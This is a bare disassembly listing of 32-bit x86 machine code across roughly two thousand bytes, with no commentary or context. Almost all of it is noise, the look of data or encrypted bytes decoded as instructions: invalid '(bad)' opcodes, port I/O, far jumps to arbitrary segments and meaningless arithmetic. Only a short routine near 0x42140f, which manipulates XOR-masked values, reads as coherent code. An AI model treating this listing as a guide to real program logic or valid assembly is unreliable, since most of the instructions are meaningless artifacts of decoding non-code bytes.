  4211e5:	inc    BYTE PTR [ecx-0x4cd1aaa8]
  4211eb:	pop    es
  4211ec:	mov    ebx,0xf7ab823f
  4211f1:	jae    0x4211ea
  4211f3:	out    dx,al
  4211f4:	push   esp
  4211f5:	mov    ebx,0xa0c50406
  4211fa:	(bad)  
  4211fc:	jne    0x4211f1
  4211fe:	call   0x74f3b9df
  421203:	bound  edx,QWORD PTR ss:[eax]
  421206:	jbe    0x42121a
  421208:	aas    
  421209:	in     al,dx
  42120a:	push   0xffffffe7
  42120c:	or     BYTE PTR [esi-0x63],cl
  42120f:	sub    edi,0xffffffbc
  421212:	push   cs
  421213:	pop    esp
  421214:	mov    ds:0x339bbc8e,al
  421219:	sub    DWORD PTR [ebx-0x692bd63b],ecx
  42121f:	mov    eax,ds:0xc6f34f01
  421224:	stos   DWORD PTR es:[edi],eax
  421225:	mov    ebp,0xe3205c85
  42122a:	dec    ebp
  42122b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42122c:	inc    eax
  42122d:	push   ecx
  42122f:	iret   
  421230:	loop   0x4212a1
  421232:	ins    BYTE PTR es:[edi],dx
  421233:	jo     0x421282
  421235:	int3   
  421236:	pop    ebp
  421237:	add    cl,ah
  421239:	add    ch,BYTE PTR [edx-0x61ea021b]
  42123f:	sub    BYTE PTR [eax],bh
  421241:	test   BYTE PTR [esi-0x76],al
  421244:	fwait
  421245:	xchg   ecx,eax
  421246:	xchg   BYTE PTR [edx],cl
  421248:	gs xchg ebx,eax
  42124a:	arpl   WORD PTR [edi+0xc3e7f4f],dx
  421250:	or     al,0xf7
  421252:	test   eax,0xb9df1bc0
  421257:	ja     0x421265
  421259:	mov    es,ecx
  42125b:	in     eax,dx
  42125c:	sbb    ah,BYTE PTR [esi+0x2b]
  42125f:	scas   eax,DWORD PTR es:[edi]
  421260:	ss inc edi
  421262:	pop    ss
  421263:	or     DWORD PTR [ecx+0x4862a6a8],ebx
  421269:	pop    esp
  42126a:	ret    
  42126b:	dec    BYTE PTR [edi]
  42126d:	imul   edx,edi,0x18fc17b6
  421273:	stos   DWORD PTR es:[edi],eax
  421274:	scas   eax,DWORD PTR es:[edi]
  421275:	dec    ecx
  421276:	data16 (bad) 
  421278:	sbb    al,0xd4
  42127a:	test   al,0xff
  42127c:	repz mov al,ds:0x767bf5c2
  421282:	mov    bl,0x82
  421284:	mov    BYTE PTR [eax-0x2e1ddab2],ch
  42128a:	xchg   ebp,eax
  42128b:	jne    0x421245
  42128d:	scas   al,BYTE PTR es:[edi]
  42128e:	into   
  42128f:	ja     0x421226
  421291:	idiv   BYTE PTR [ecx+ebx*8+0x1a]
  421295:	cli    
  421296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421297:	shl    BYTE PTR ds:0x4e7fe447,1
  42129d:	int    0x54
  42129f:	inc    ecx
  4212a0:	outs   dx,BYTE PTR ds:[esi]
  4212a1:	inc    eax
  4212a2:	pop    ds
  4212a3:	(bad)  
  4212a4:	cmp    edx,eax
  4212a6:	ret    
  4212a7:	lock fwait
  4212a9:	adc    DWORD PTR [ebp+0x5dc880f9],0xff04b9a2
  4212b3:	loopne 0x4212cc
  4212b5:	(bad)  [edi-0x2b]
  4212b8:	stos   DWORD PTR es:[edi],eax
  4212b9:	jge    0x42133a
  4212bb:	pop    es
  4212bc:	push   edi
  4212bd:	xor    BYTE PTR [edi-0x3d],al
  4212c0:	pop    es
  4212c1:	mov    ah,0xa7
  4212c3:	ret    
  4212c4:	lods   al,BYTE PTR ds:[esi]
  4212c5:	jnp    0x421308
  4212c7:	out    0x7e,al
  4212c9:	call   0xe11b:0xa3b8bbb1
  4212d0:	jae    0x421311
  4212d2:	add    al,ch
  4212d4:	stc    
  4212d5:	(bad)  
  4212d6:	push   ss
  4212d7:	test   BYTE PTR [edx-0x7f],bl
  4212da:	fdiv   st,st(2)
  4212dc:	sub    dh,BYTE PTR [esi+0x565b651e]
  4212e2:	gs dec edi
  4212e4:	test   DWORD PTR [ecx],eax
  4212e6:	or     eax,0x2d66bbfc
  4212eb:	jmp    0x5748:0x43e57ce1
  4212f2:	sbb    eax,0x9b08e688
  4212f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212f8:	push   ss
  4212f9:	dec    ebp
  4212fa:	sbb    DWORD PTR [edx-0x3a],ecx
  4212fd:	dec    ebp
  4212fe:	dec    edx
  4212ff:	inc    edi
  421300:	fdivrp st(5),st
  421302:	pop    eax
  421303:	jbe    0x42135c
  421305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421306:	int3   
  421307:	data16 jge 0x4212bb
  42130a:	stc    
  42130b:	hlt    
  42130c:	push   edi
  42130d:	adc    al,0x34
  42130f:	cmp    eax,0x2e718b77
  421314:	mov    ch,0x59
  421316:	push   ds
  421317:	enter  0xe3c2,0xa5
  42131b:	out    dx,al
  42131c:	js     0x421312
  42131e:	or     edi,DWORD PTR [ebp+0x21b84303]
  421324:	icebp  
  421325:	push   edx
  421326:	and    ebx,ebp
  421328:	loopne 0x4212c9
  42132a:	cmp    ebx,ebx
  42132c:	adc    ch,BYTE PTR [esi-0x44]
  42132f:	mov    bh,0xc8
  421331:	dec    ebp
  421332:	jmp    0x8fb3:0x7826f8da
  421339:	data16 or BYTE PTR [eax],0x2c
  42133d:	(bad)  
  42133e:	ins    DWORD PTR es:[edi],dx
  42133f:	xchg   esp,eax
  421340:	xchg   BYTE PTR [eax+0x69],ch
  421343:	xchg   ecx,eax
  421344:	das    
  421345:	ins    DWORD PTR es:[edi],dx
  421346:	adc    DWORD PTR [ebp+0x5f29a4ab],esi
  42134c:	lods   eax,DWORD PTR ds:[esi]
  42134d:	cmc    
  42134e:	ret    0xc56d
  421351:	and    eax,0x8434aeef
  421356:	repz xlat BYTE PTR ds:[ebx]
  421358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421359:	sub    esp,DWORD PTR [ecx]
  42135b:	and    ebp,DWORD PTR [edi-0x211c762b]
  421361:	lods   al,BYTE PTR ds:[esi]
  421362:	in     eax,dx
  421363:	fcom   DWORD PTR [edx+0x3d2bc66e]
  421369:	out    dx,al
  42136a:	cwde   
  42136b:	aam    0x95
  42136d:	sub    DWORD PTR [eax],eax
  42136f:	inc    ebp
  421370:	push   ebx
  421371:	inc    esp
  421372:	loopne 0x4213a6
  421374:	jae    0x4213f5
  421376:	xchg   esp,eax
  421377:	dec    ecx
  421378:	popf   
  421379:	cmp    DWORD PTR [edi-0x11dee071],esi
  42137f:	aam    0x22
  421381:	xchg   esi,eax
  421382:	push   ss
  421383:	sub    DWORD PTR [edx-0x3b],ebp
  421386:	je     0x4213c0
  421388:	pop    es
  421389:	pop    esp
  42138a:	je     0x421332
  42138c:	sbb    bh,BYTE PTR [eax-0x60f6a782]
  421392:	sub    eax,0xc95c9a6d
  421397:	xor    cl,dl
  421399:	out    0x80,eax
  42139b:	add    eax,0xbf91c7d8
  4213a0:	push   esi
  4213a1:	daa    
  4213a2:	ficom  DWORD PTR [edx+0xb7cf51]
  4213a8:	and    edx,DWORD PTR [edx]
  4213aa:	nop
  4213ab:	fldl2e 
  4213ad:	arpl   WORD PTR [ebx],cx
  4213af:	ins    DWORD PTR es:[edi],dx
  4213b0:	pop    eax
  4213b1:	xor    ebx,DWORD PTR [esi+0x77]
  4213b4:	or     eax,DWORD PTR [ebx-0x5c]
  4213b7:	and    cl,0x99
  4213ba:	in     eax,dx
  4213bb:	cmp    eax,0xe667ccea
  4213c0:	push   esi
  4213c1:	out    dx,al
  4213c2:	mov    bh,0xd1
  4213c4:	pop    esp
  4213c5:	neg    DWORD PTR [edi]
  4213c7:	cmp    BYTE PTR ds:0x50c8e9a1,0x2a
  4213ce:	mov    al,0xa3
  4213d0:	jmp    0x1a3d:0x16da7227
  4213d7:	pop    edx
  4213d8:	fyl2xp1 
  4213da:	xchg   ebp,eax
  4213db:	leave  
  4213dc:	mov    WORD PTR [ecx+0x65a30afc],?
  4213e2:	jno    0x421438
  4213e4:	or     edx,DWORD PTR [edx]
  4213e6:	ss push esi
  4213e8:	mov    bl,0xca
  4213ea:	cmc    
  4213eb:	xor    DWORD PTR [eax-0x68],edi
  4213ee:	pop    esi
  4213ef:	or     eax,0x1a1547b8
  4213f4:	leave  
  4213f5:	inc    eax
  4213f6:	les    esi,FWORD PTR [edx]
  4213f8:	iret   
  4213f9:	and    al,0x6
  4213fb:	pop    edi
  4213fc:	inc    ebx
  4213fd:	inc    edi
  4213fe:	loope  0x42141f
  421400:	xor    al,0x4a
  421402:	int    0x26
  421404:	into   
  421405:	mov    ah,0xf3
  421407:	lahf   
  421408:	setb   BYTE PTR [esi]
  42140b:	adc    edx,edi
  42140d:	sbb    al,0xf1
  42140f:	mov    ecx,DWORD PTR [ebp+0x8]
  421412:	xor    ecx,eax
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xabba88e2
  42147c:	(bad)  
  42147d:	xchg   esi,eax
  42147e:	ja     0x42144d
  421480:	add    DWORD PTR [eax],eax
  421482:	add    BYTE PTR fs:[eax],al
  421485:	add    BYTE PTR [esi],dh
  421487:	call   0x854c:0xcd898f7c
  42148e:	and    ebx,DWORD PTR [ebp+0x59]
  421491:	outs   dx,DWORD PTR ds:[esi]
  421492:	loopne 0x42146f
  421494:	(bad)  
  421495:	std    
  421496:	in     al,dx
  421497:	jae    0x4214c2
  421499:	sbb    al,0x9c
  42149b:	(bad)  
  42149c:	pop    edx
  42149d:	push   ds
  42149e:	popf   
  42149f:	sbb    ebp,eax
  4214a1:	mov    ds:0x2fd244c7,al
  4214a6:	adc    BYTE PTR [edx-0x9],cl
  4214a9:	cmp    DWORD PTR [eax+ebp*1],eax
  4214ac:	ins    DWORD PTR es:[edi],dx
  4214ad:	popa   
  4214ae:	mov    WORD PTR [ecx],ss
  4214b0:	aad    0x55
  4214b2:	in     eax,dx
  4214b3:	sub    al,0x2c
  4214b5:	gs jp  0x4214b6
  4214b8:	pop    ss
  4214b9:	in     al,dx
  4214ba:	sub    BYTE PTR [eax+0x46448d86],ch
  4214c0:	enter  0xeb9,0x5f
  4214c4:	pop    esp
  4214c5:	add    al,0xe7
  4214c7:	adc    al,0x5e
  4214c9:	pop    ecx
  4214ca:	shr    BYTE PTR [ebp-0x5eb557f3],1
  4214d0:	push   eax
  4214d1:	je     0x421480
  4214d3:	mov    cl,0xa
  4214d5:	pop    eax
  4214d6:	jmp    0xdea5a02e
  4214db:	add    bh,ah
  4214dd:	adc    esi,ebx
  4214df:	xor    al,0xe1
  4214e1:	inc    edx
  4214e2:	pop    ds
  4214e3:	jmp    0x421557
  4214e5:	adc    esp,ebp
  4214e7:	jnp    0x4214cb
  4214e9:	add    DWORD PTR [eax],eax
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x953dbac2
  4214fe:	fcmovne st,st(5)
  421500:	add    DWORD PTR [eax],eax
  421502:	add    BYTE PTR fs:[eax],al
  421505:	add    bh,bh
  421507:	out    0xdf,eax
  421509:	dec    edi
  42150a:	loop   0x421541
  42150c:	shl    DWORD PTR [esp+edi*1-0x20],0x27
  421511:	sub    eax,0xa0b96357
  421516:	call   0x136599c0
  42151b:	sbb    ebx,DWORD PTR [edx+0xe]
  42151e:	xor    edi,ecx
  421520:	cs mov ch,0xe8
  421523:	rcl    BYTE PTR [ebx-0x7c69a50e],0xf
  42152a:	imul   edi,DWORD PTR [ebx-0x3f8a523e],0x3f
  421531:	stos   BYTE PTR es:[edi],al
  421532:	dec    edi
  421533:	mov    DWORD PTR [ebx+0x72395352],ebp
  421539:	push   ss
  42153a:	out    0xb3,al
  42153c:	out    dx,al
  42153d:	xchg   ah,bh
  42153f:	push   eax
  421540:	dec    ebp
  421541:	lods   eax,DWORD PTR ds:[esi]
  421542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421543:	bound  ebx,QWORD PTR [ecx-0x320d1a49]
  421549:	xchg   edx,eax
  42154a:	shl    BYTE PTR [ebx*4-0xb79efe0],cl
  421551:	cmp    ah,BYTE PTR [ebp+0x51]
  421554:	xchg   esp,eax
  421555:	jno    0x4215ab
  421557:	shr    BYTE PTR [eax+edi*8+0x2d6567eb],0x9c
  42155f:	mul    ch
  421561:	pushf  
  421562:	sbb    esp,DWORD PTR [esi+0x299b73d3]
  421568:	(bad)  
  421569:	nop
  42156a:	add    BYTE PTR [eax],al
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0xcb7c2a1],0x3f
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	add    BYTE PTR fs:[eax],al
  421585:	add    BYTE PTR [ebx+0x5119eeea],al
  42158b:	call   DWORD PTR [eax+0x13]
  42158e:	rcl    DWORD PTR [esi+eax*2+0x6f],1
  421592:	add    bh,bl
  421594:	jecxz  0x4215ca
  421596:	jecxz  0x4215ff
  421598:	shr    BYTE PTR [eax+0x7cfc92a2],cl
  42159e:	std    
  42159f:	test   eax,0xb241cf7e
  4215a4:	fndisi(8087 only) 
  4215a6:	dec    ecx
  4215a7:	retf   0x55cd
  4215aa:	test   BYTE PTR [ebp+0x3bd5bd10],0xd
  4215b1:	(bad)  [esp+esi*2]
  4215b4:	add    DWORD PTR [ebx-0x5104b9d6],eax
  4215ba:	cld    
  4215bb:	fldenv ds:0xeca94b86
  4215c1:	push   es
  4215c2:	fst    DWORD PTR [ebx+0x4bb38d12]
  4215c8:	mov    ebx,DWORD PTR [ebp+0x56]
  4215cb:	xchg   BYTE PTR [ebx],bl
  4215cd:	jge    0x421565
  4215cf:	lds    ebx,FWORD PTR [ebx+edi*1+0x156b61b2]
  4215d6:	pushf  
  4215d7:	xlat   BYTE PTR ds:[ebx]
  4215d8:	cmp    bl,ah
  4215da:	or     ebx,0x48c5418e
  4215e0:	lods   eax,DWORD PTR ds:[esi]
  4215e1:	bound  ebp,QWORD PTR [edi]
  4215e3:	xchg   cl,bh
  4215e5:	mov    edx,0x9c588c01
  4215ea:	add    BYTE PTR [eax],al
  4215ec:	add    BYTE PTR [eax],al
  4215ee:	das    
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	and    ecx,DWORD PTR [edx-0x315c111b]
  421600:	add    DWORD PTR [eax],eax
  421602:	add    BYTE PTR fs:[eax],al
  421605:	add    BYTE PTR [edx+0x19a4543],dl
  42160b:	xchg   edx,eax
  42160c:	sbb    DWORD PTR [eax+0x3],ebp
  42160f:	ror    bl,cl
  421611:	push   0xffffff96
  421613:	call   0xc6142549
  421618:	and    DWORD PTR [eax],ecx
  42161a:	(bad)  
  42161b:	stc    
  42161c:	and    eax,0x11a138c2
  421621:	and    eax,0x93ef4598
  421626:	push   edi
  421627:	pop    edi
  421628:	fnstcw WORD PTR [edi]
  42162a:	shl    BYTE PTR [ebp+0x6a],1
  42162d:	mov    BYTE PTR [ecx+0x24],dh
  421630:	jns    0x421687
  421632:	test   bh,al
  421634:	jmp    0x5a747a8e
  421639:	cmp    BYTE PTR cs:[edx+0x3137773d],ah
  421640:	icebp  
  421641:	out    0x59,al
  421643:	fild   WORD PTR [ecx]
  421645:	cmp    eax,esp
  421647:	loopne 0x42163f
  421649:	dec    DWORD PTR [edi-0xad1f35c]
  42164f:	adc    eax,0x35612104
  421654:	stos   BYTE PTR es:[edi],al
  421655:	or     eax,0x181da0d0
  42165a:	icebp  
  42165b:	(bad)  
  42165c:	adc    DWORD PTR [ecx+0x2c],edx
  42165f:	sub    ecx,DWORD PTR [esi+0x60e3d83a]
  421665:	repz (bad) 
  421667:	out    0x54,al
  421669:	mov    ch,0x0
  42166b:	add    BYTE PTR [eax],al
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x5401d8b5,al
  42167e:	pop    es
  42167f:	iret   
  421680:	add    DWORD PTR [eax],eax
  421682:	add    BYTE PTR fs:[eax],al
  421685:	add    BYTE PTR [eax-0x6f],cl
  421688:	out    dx,al
  421689:	mov    ss,edx
  42168b:	mov    ah,0xaf
  42168d:	mov    eax,0xba5b3684
  421692:	add    eax,0x90fb82bf
  421697:	rcr    DWORD PTR [esi+0x41630f20],1
  42169d:	adc    esi,DWORD PTR [esi+0x9]
  4216a0:	data16 sub BYTE PTR fs:[edx-0x3478b004],dl
  4216a8:	lea    ecx,[edi+ebx*8]
  4216ab:	mov    ds:0x526c2999,eax
  4216b0:	cli    
  4216b1:	test   DWORD PTR [edx],ebp
  4216b3:	pop    ss
  4216b4:	push   ds
  4216b5:	jp     0x42166e
  4216b7:	repnz addr16 out dx,al
  4216ba:	push   cs
  4216bb:	inc    esi
  4216bc:	aaa    
  4216bd:	cwde   
  4216be:	xlat   BYTE PTR ds:[ebx]
  4216bf:	dec    edi
  4216c0:	and    esp,edi
  4216c2:	out    dx,al
  4216c3:	inc    ebx
  4216c4:	sahf   
  4216c5:	xchg   edi,eax
  4216c6:	push   ebx
  4216c7:	addr16 mov ecx,0xd8f2e494
  4216cd:	xor    ebx,0xffffff99
  4216d0:	pop    edi
  4216d1:	mov    bl,BYTE PTR [edi-0x8]
  4216d4:	mov    eax,0xefc6bb06
  4216d9:	aad    0x1b
  4216db:	and    dl,cl
  4216dd:	in     eax,0x1c
  4216df:	pop    edx
  4216e0:	bound  ebp,QWORD PTR [edi]
  4216e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216e3:	mov    al,0xf2
  4216e5:	jae    0x421728
  4216e7:	retf   
  4216e8:	bnd jae 0x4216eb
  4216eb:	add    BYTE PTR [eax],al
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	xchg   ebx,eax
  4216fb:	mov    cs,WORD PTR [edi+0x23]
  4216fe:	imul   ecx,edi,0x1
  421701:	add    BYTE PTR [eax+eax*1+0x0],ah
  421705:	add    BYTE PTR [ebp-0x57],bl
  421708:	cmp    al,0x40
  42170a:	hlt    
  42170b:	dec    esp
  42170c:	cmp    al,0xf5
  42170e:	pusha  
  42170f:	shr    BYTE PTR [edx-0x604d6dc],cl
  421715:	int3   
  421716:	sbb    al,0xa3
  421718:	div    BYTE PTR [ecx-0x7d07b589]
  42171e:	sbb    eax,esp
  421720:	rep outs dx,BYTE PTR ds:[esi]
  421722:	aad    0xaa
  421724:	shl    BYTE PTR [ecx+0x2b],1
  421727:	pop    ds
  421728:	mov    ds:0xfe5f792,al
  42172d:	adc    BYTE PTR [edi],dl
  42172f:	sbb    BYTE PTR [edi-0x3d],dh
  421732:	test   DWORD PTR ds:0x9c094049,edi
  421738:	add    BYTE PTR [edi+0x24b407f3],al
  42173e:	scas   eax,DWORD PTR es:[edi]
  42173f:	add    ebp,DWORD PTR [ebp-0x29]
  421742:	sahf   
  421743:	test   DWORD PTR [esi],0x763070e2
  421749:	xchg   ebp,ecx
  42174b:	sbb    dl,al
  42174d:	sar    BYTE PTR [ebp+0x11],0xd
  421751:	adc    eax,0xfb7e364e
  421756:	adc    al,0x35
  421758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421759:	mov    ebx,0xdd87172f
  42175e:	mov    ebx,0xa0028c8e
  421763:	sub    bh,dl
  421765:	jle    0x4217e0
  421767:	(bad)  
  421768:	retf   0x3a
  42176b:	add    BYTE PTR [eax],al
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xc6a4e09
  42177b:	jge    0x421728
  42177d:	add    eax,0x1cfcf
  421782:	add    BYTE PTR fs:[eax],al
  421785:	add    bl,ch
  421787:	mov    WORD PTR [ecx],?
  421789:	test   al,0x1f
  42178b:	push   cs
  42178c:	mov    ds:0xa72b9684,eax
  421791:	leave  
  421792:	stc    
  421793:	dec    cl
  421795:	dec    ebx
  421796:	mov    al,BYTE PTR [ebp-0x5b001a69]
  42179c:	je     0x4217a3
  42179e:	in     eax,dx
  42179f:	mov    eax,es:0x9aae50f8
  4217a5:	add    eax,0x9166033a
  4217aa:	aam    0x8e
  4217ac:	dec    eax
  4217ad:	add    bl,dh
  4217af:	mov    esp,DWORD PTR [edx-0x70]
  4217b2:	inc    edx
  4217b3:	sbb    al,0x24
  4217b5:	mov    eax,0x8ba068d2
  4217ba:	out    dx,eax
  4217bb:	xor    esi,DWORD PTR [edi]
  4217bd:	aad    0x38
  4217bf:	lds    esp,FWORD PTR [edx+0x406d2a0d]
  4217c5:	or     DWORD PTR es:[edx],edx
  4217c8:	xchg   BYTE PTR [edi+0x79],cl
  4217cb:	add    ch,al
  4217cd:	test   al,0x7b
  4217cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d0:	mov    bl,0xb7
  4217d2:	stos   BYTE PTR es:[edi],al
  4217d3:	cli    
  4217d4:	cmp    DWORD PTR [esi-0x24fdda27],0xffffffed
  4217db:	nop
  4217dc:	mov    bl,bl
  4217de:	jb     0x4217f1
  4217e0:	lods   eax,DWORD PTR ds:[esi]
  4217e1:	adc    DWORD PTR [ebx+0x19b40ecd],ebx
  4217e7:	pop    ebp
  4217e8:	sbb    ch,BYTE PTR [esi+0x0]
  4217ee:	adc    bh,BYTE PTR [edx-0x19073928]
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	and    al,0xe3
  4217fc:	fdivp  st(3),st
  4217fe:	repz loop 0x421802
  421801:	add    BYTE PTR [eax+eax*1+0x0],ah
  421805:	add    BYTE PTR [edx-0x7b],cl
  421808:	jnp    0x42178b
  42180a:	xchg   esp,eax
  42180b:	addr16 es inc ebp
  42180e:	push   ecx
  42180f:	mov    esp,0x9368186
  421814:	pop    edx
  421815:	pop    ss
  421816:	ror    DWORD PTR [edi+0x21],1
  421819:	lods   eax,DWORD PTR ds:[esi]
  42181a:	mov    eax,ds:0x2436d5b2
  42181f:	sub    eax,0x8f4e8a04
  421824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421825:	lock fdivr st,st(1)
  421828:	and    edi,ebp
  42182a:	xchg   esp,eax
  42182b:	mov    al,ds:0xa2a04b38
  421830:	fist   WORD PTR [esi-0x1a]
  421833:	mov    edi,0x3787222c
  421838:	mov    gs,WORD PTR [esi-0xbb74063]
  42183e:	xor    dl,al
  421840:	or     ebp,esp
  421842:	add    ebp,edi
  421844:	push   ecx
  421845:	inc    esp
  421846:	sbb    eax,0xe08fedd0
  42184b:	mov    bh,0x92
  42184d:	aam    0x79
  42184f:	xchg   esp,eax
  421850:	mov    WORD PTR [ebx-0x1b4fc0],es
  421856:	lahf   
  421857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421858:	sbb    al,0xf3
  42185a:	cmp    ah,BYTE PTR [ecx-0x702fad5]
  421860:	imul   BYTE PTR [edi-0x2d]
  421863:	xor    al,ch
  421865:	lock (bad) 
  421867:	sub    ecx,DWORD PTR [ebx+0x90]
  42186d:	add    BYTE PTR [ecx+0x46],cl
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	push   ebx
  42187b:	es je  0x421833
  42187e:	push   edi
  42187f:	jecxz  0x421882
  421881:	add    BYTE PTR [eax+eax*1+0x0],ah
  421885:	add    BYTE PTR [eax+0x7f],cl
  421888:	mov    ah,0xea
  42188a:	test   BYTE PTR [ecx+0x5a],0x67
  42188e:	sub    DWORD PTR [ebx+0x2c],ecx
  421891:	push   ebx
  421892:	or     ebx,eax
  421894:	xchg   BYTE PTR [edi+0x3e34d025],dh
  42189a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42189b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42189c:	ja     0x4218d0
  42189e:	and    esi,edx
  4218a0:	dec    edi
  4218a1:	mov    bh,0xc4
  4218a3:	jns    0x42184c
  4218a5:	and    dl,bl
  4218a7:	popa   
  4218a8:	dec    edx
  4218a9:	add    al,0x5e
  4218ab:	rol    DWORD PTR [ebp-0x67],0xb6
  4218af:	sub    eax,0x11817e9b
  4218b4:	mov    ch,0xad
  4218b6:	push   eax
  4218b7:	ret    0x2cce
  4218ba:	cmp    al,0xed
  4218bc:	jecxz  0x4218c2
  4218be:	inc    ecx
  4218bf:	pop    edi
  4218c0:	jo     0x4218d0
  4218c2:	aam    0xe1
  4218c4:	inc    esi
  4218c5:	into   
  4218c6:	add    DWORD PTR [edx],ecx
  4218c8:	sub    ebp,edi
  4218ca:	sbb    BYTE PTR ds:0x8d73e03c,dl
  4218d0:	div    DWORD PTR [edx]
  4218d2:	mov    ebp,0xc20e9b8a
  4218d7:	shl    BYTE PTR [edi+0x3bdf03f5],0xb6
  4218de:	mov    bl,0xf8
  4218e0:	and    eax,0xc6c3448b
  4218e5:	repz aam 0xb8
  4218e8:	int3   
  4218e9:	or     eax,DWORD PTR [eax]
  4218eb:	add    BYTE PTR [eax],al
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x65b6da72
  4218fc:	shl    DWORD PTR [eax+0x1e3bb],1
  421902:	add    BYTE PTR fs:[eax],al
  421905:	add    BYTE PTR [eax-0x5c],al
  421908:	inc    edi
  421909:	in     eax,0xff
  42190b:	popf   
  42190c:	outs   dx,DWORD PTR ds:[esi]
  42190d:	mov    ebx,DWORD PTR [ecx+ebp*2-0x1ff1c552]
  421914:	jecxz  0x421980
  421916:	dec    edx
  421917:	pop    ebx
  421918:	inc    edx
  421919:	xchg   esp,eax
  42191a:	add    al,0x76
  42191c:	lock mov ch,0x9a
  42191f:	pop    ebx
  421920:	and    eax,0x30a08d71
  421925:	sub    DWORD PTR [esi],0x0
  421928:	popf   
  421929:	neg    edx
  42192b:	dec    ecx
  42192c:	push   edx
  42192d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42192e:	mov    dh,0xe1
  421930:	pop    ss
  421931:	loop   0x421972
  421933:	test   eax,0x6a96e87a
  421938:	xlat   BYTE PTR ds:[ebx]
  421939:	mov    ebp,0xb30543c0
  42193e:	mov    edi,0xa95caf94
  421943:	stc    
  421944:	rcl    BYTE PTR [ecx],0xc1
  421947:	icebp  
  421948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421949:	cmp    eax,0x7fed8893
  42194e:	mov    edi,0x9fab460b
  421953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421954:	lock mov cl,0x4a
  421957:	mov    al,0xa4
  421959:	jl     0x421986
  42195b:	mov    ebp,0x9179072b
  421960:	adc    eax,0x7f4cc6b8
  421965:	mov    al,ds:0x67a73b6e
  42196a:	add    BYTE PTR [eax],al
  42196c:	add    BYTE PTR [eax],al
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0x536ded47,eax
  42197d:	loop   0x42199e
  42197f:	in     al,0x1
  421981:	add    BYTE PTR [eax+eax*1+0x0],ah
  421985:	add    bl,bh
  421987:	jp     0x421913
  421989:	imul   ebp,DWORD PTR [eax-0x3f368efa],0x82f764f
  421993:	push   edx
  421994:	pop    esi
  421995:	adc    esp,DWORD PTR [ebx]
  421997:	jmp    0x421a01
  421999:	or     eax,0x4b1a23be
  42199e:	inc    edi
  42199f:	in     al,dx
  4219a0:	sub    eax,0x4caf25c6
  4219a5:	add    eax,eax
